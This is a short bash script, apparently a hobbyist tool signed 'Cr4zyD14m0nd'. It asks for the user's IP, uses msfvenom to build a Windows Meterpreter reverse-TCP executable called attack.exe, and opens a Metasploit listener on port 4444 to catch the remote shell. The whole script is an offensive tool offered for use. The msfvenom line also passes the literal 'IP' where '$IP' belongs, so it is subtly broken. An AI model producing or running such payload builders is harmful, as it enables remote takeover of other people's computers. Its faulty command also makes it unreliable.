#! /bin/bash

echo "##################################"
echo "#                                #"
echo "#     WELCOME                    #"
echo "#     By: Cr4zyD14m0nd           #"
echo "#                                #"
echo "##################################"
echo ""


ifconfig
echo "Please enter your IP"
read IP

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=IP LPORT=4444 -o attack.exe
msfconsole -q -x " use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; exploit;"

